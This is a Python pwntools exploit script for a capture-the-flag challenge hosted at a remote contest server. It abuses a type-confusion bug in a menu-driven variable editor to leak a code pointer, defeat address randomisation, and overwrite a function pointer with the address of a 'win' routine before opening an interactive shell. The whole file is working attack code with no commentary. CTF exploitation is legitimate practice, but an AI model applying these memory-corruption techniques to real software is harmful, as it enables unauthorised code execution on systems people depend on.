from pwn import *

#target = process('./chall_patched', env={"LD_PRELOAD":"./libc-2.28.so"})

#pid = gdb.attach(target, "b *display+32\nb *create_variable+314\n set disassembly-flavor intel\ncontinue")

target = remote('host.cg21.metaproblems.com', 3150)

elf = ELF('chall')


def create_string(length, content):

	print(target.recvuntil(b'5. Exit'))
	target.sendline(b'1')
	print(target.recvuntil(b'What type would you like?'))
	target.sendline(b'1')
	print(target.recvuntil(b'like your string to be'))
	target.sendline(str(length))
	print(target.recvuntil(b'data'))
	target.sendline(content)

def edit_char(index, character):
	print(target.recvuntil(b'5. Exit'))
	target.sendline(b'3')
	print(target.recvuntil(b'What index would you like to modify'))
	target.sendline(str(index))
	print(target.recvuntil(b'What type would you like?'))
	target.sendline(b'4')
	print(target.recvuntil(b'What is your value:'))
	target.sendline(character)

def edit_string(index, length, data):
	print(target.recvuntil(b'5. Exit'))
	target.sendline(b'3')

	print(target.recvuntil(b'What index would you like to modify'))
	target.sendline(str(index))

	print(target.recvuntil(b'What type would you like?'))
	target.sendline(b'1')

	print(target.recvuntil(b'like your string to be'))
	target.sendline(str(length))

	print(target.recvuntil(b'data'))
	target.sendline(data)

def display():
	print(target.recvuntil(b'5. Exit\n'))
	target.sendline(b'2')

create_string(20, '0' * 20)
create_string(20, '1' * 20)

edit_char(0, b'\x70')
edit_string(0, 0, b'')

display()

leak = target.recv(6)
print(leak)
display_string = u64(leak + b'\x00' * 2)
print(hex(display_string))

pie_base = display_string - elf.symbols['display_string']
win = pie_base + elf.symbols['win']
print(hex(win))

#Round 2: 

edit_char(1, b'\x70')

edit_string(1, 8, p64(win))

display()

target.interactive()
